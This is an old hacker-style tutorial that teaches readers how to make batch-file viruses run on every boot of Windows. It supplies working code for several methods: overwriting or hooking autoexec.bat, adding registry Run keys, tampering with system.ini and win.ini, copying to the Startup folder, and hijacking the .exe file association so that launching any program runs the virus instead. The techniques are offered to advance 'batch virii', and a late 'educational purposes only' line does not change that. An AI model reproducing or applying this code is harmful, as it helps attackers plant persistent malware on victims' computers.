   In this tutorial I will be discussing the different methods in which you can make your batch file execute
   on startup, all of the ways depicted in this tutorial work on Windows Vista! It is essential for a proper
   virus to startup each time the computer is booted so it can carry out it's routines on a frequent basis.
   This tutorial is not for people trying to learn batch but rather for those trying to advance in batch!!
   I would also like to send a big thanks to SAD1c for some of the code i used from his tutorials!!


  1)Autoexec.bat Method:
    -------------------

   There are 2 differnt methods in autoexec.bat, we can either write the whole virus to autoexec.bat or
   we can simply make a hook for autoexec.bat to call our virus. I personally prefer the hooking method, as 
   an oversized autoexec.bat may raise a few eyebrows, however, I shall illustrate both methods.

  a)Copying whole virus to autoexec.bat (this should be put in the begining of your virus):
  -----------------------------------------------[Cut Here]---------------------------------------------
  attrib -r -h C:\autoexec.bat
  echo.@echo off>>C:\autoexec.bat
  echo.echo my virus would be here>>C:\autoexec.bat
  echo.pause>>C:\autoexec.bat
  attrib +r +h C:\autoexec.bat
  -----------------------------------------------[Cut Here]---------------------------------------------
   All you have to do is add your virus code lines in the lines where i put the 'echo my virus...' and 
   'pause' adding more lines as needed, it will then write your virus code to autoexec.bat


  b)Hooking Autoexec.bat Technique (HAT):

   This is my prefered method and it will copy the current batch file to C:\virus.bat and then hook
   the batch file C:\virus.bat for the next startup (Should be placed at begining of Virus):
  -----------------------------------------------[Cut Here]---------------------------------------------
 attrib -r -h C:\autoexec.bat
  copy %0 C:\WinServ.bat >nul
  type C:\autoexec.bat|find "WinServ.bat">C:\autoexec.bat
  echo call C:\WinServ.bat>>C:\autoexec.bat
  attrib +r +h C:\autoexec.bat
  -----------------------------------------------[Cut Here]---------------------------------------------
   All you need to do is change the batch name from Winserv.bat to your own, what this code will do is
   write a new hooking line each startup to make sure the batch only gets called up once per start up.


  2)Registery Method:
    ----------------

   This will show the various registery keys you could use to execute your batch file each run. Although
   there are different registery keys doing different things, they will all - in practice - ultimately startup
   your virus on each computer boot:

   As I said before there are many variants; here are some:

  - HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

  - HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

  - HKEY_LOCAL_MACHINE\SOFTWARE\ Microsoft\Windows\CurrentVersion\RunServices

  - HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServicesOnce

  - HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

   The "RunOnce" and "RunServicesOnce" deletes the registry key after running the file,
   but this isn't a problem, because the batch file will be executed again, so it will add
   the key. Now they all work on the same principle when adding the keys to the registery so
   i shall now show you two keys the first is '-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
   This will then add a registery key in HKLM startup called 'WinBoot' and the path of the virus will be C:\virus.bat:
  -----------------------------------------------[Cut Here]---------------------------------------------
  REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v WinBoot /t REG_SZ /d C:\virus.bat
  -----------------------------------------------[Cut Here]---------------------------------------------
   The name of the startup key and the location of the virus can be changed at will.

   Next i will show the registery ADD key for HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
   It works on the same principle except because we are dealling with HKEY_CURRENT_USER instead of HKEY_LOCAL_MACHINE
  we then write 'REG ADD HKCU...." See below:
  -----------------------------------------------[Cut Here]---------------------------------------------
  REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v WinBoot /t REG_SZ /d C:\virus.bat
  -----------------------------------------------[Cut Here]---------------------------------------------


  3)System.ini Method:
    ------------------

   This method will make System.ini call your batch file up each startup, we cannot just write to the system.ini
   as it will then delete whatever else was in their so instead we write a seperate file in %tmp% then
   type it in to the sytem.ini pretty simple i'd say:
  ----------------------------------------------[Cut Here]---------------------------------------------
  copy %0 %windir%\WinDebug.bat
  find /v /i "[boot]"<%WiNDir%\system.ini>temp1.tmp
  find /v /i "shell=explorer.exe"<temp1.tmp>temp2.tmp
  echo [boot]>%wIndIR%\system.ini
  echo Shell=Explorer.exe WinDebug.bat>>%wiNdIR%\system.ini
  type temp2.tmp>>%WIndIR%\system.ini
  del temp?.tmp
  -----------------------------------------------[Cut Here]--------------------------------------------- 


  4)Win.ini Method:
    ---------------

   We shall now do the same for win.ini; write to a temporary then type it into win.ini, see below:
  -----------------------------------------------[Cut Here]---------------------------------------------
  copy %0 %windir%\TaskLoad.bat.
  find /v /i "[windows]"<%windir%\win.ini>temp1.tmp
  find /v /i "load="<temp1.tmp>temp2.tmp
  find /v /i "run="<temp2.tmp>temp1.tmp
  find /v /i "NullPort="<temp1.tmp>temp2.tmp
  echo [windows]>%wiNdIR%\win.ini
  echo load=TaskLoad.bat>>%winDIr%\win.ini
  echo run=>>%wINDir%\win.ini
  echo NullPort=None>>%windIr%\win.ini
  type temp2.tmp>>%wiNDir%\win.ini
  del temp?.tmp
  -----------------------------------------------[Cut Here]--------------------------------------------- 


  5)Startup Folder Method:
    ---------------------

   We will now look at the simplest and not very effective method as most computer literate people will look here
   for any application that starts up, but still effective, however, i could not get it to write to windows
   Vista startup folder, i have done it before but for the life of me i cannot remember the technique i used
   so for now this method will only work on XP:
  -----------------------------------------------[Cut Here]---------------------------------------------
  Copy %0 C:\WinBoot.bat
  copy C:\WinBoot.bat "%UserProfile%\Start Menu\Programs\Startup\"
  -----------------------------------------------[Cut Here]--------------------------------------------- 


  6)Shell Spawning:
    ---------------

   Shell spawning was first seen in SAD1c's BOM batch generator, what it does is associate our batch file 
   with the extension of an .exe or anything else we give it, so each time an .exe is opened, it will then 
   instead open our batch file and the .exe wont be opened, a very good way to keep our batch in memory.
   I tried out SAD1c's Shell spawn and it did not gel to well with my windows vista, so instead i made my
   own; similar but alot smaller and less complex:
  -----------------------------------------------[Cut Here]---------------------------------------------
  copy %0 C:\WinBat.bat
  echo.on error resume next>temp.vbs
  echo set sh=createobject("wscript.shell")>>temp.vbs
  echo sh.regwrite "HKCR\exefile\Shell\Open\Command\","wscript.exe C:\CmdLoad.vbs ""%%1 %%*""">>temp.vbs
  cscript temp.vbs
  del temp.vbs
  echo.set shell = createobject("wscript.shell")>>C:\CmdLoad.vbs
  echo.shell.run "C:\WinBat.bat">>C:\CmdLoad.vbs
  -----------------------------------------------[Cut Here]---------------------------------------------
  It is important to take into account, that alot of .exe's will be executed therefore your batch will 
  untechnically have residency, so if your batch is set to send over p2p etc and it is contionusly executed
  this could slow down systems even to a halt!! We therefore should make parameters, and if they are
  met then only is the batch routine executed.


 Thanks alot for taking your time to read this, i hope it will help you with further ventures into more awesome
 batch virii. Please contact me for any queries, problems etc. REMEMBER THIS TUTORIAL IS FOR EDUCATIONAL PURPOSES ONLY!!
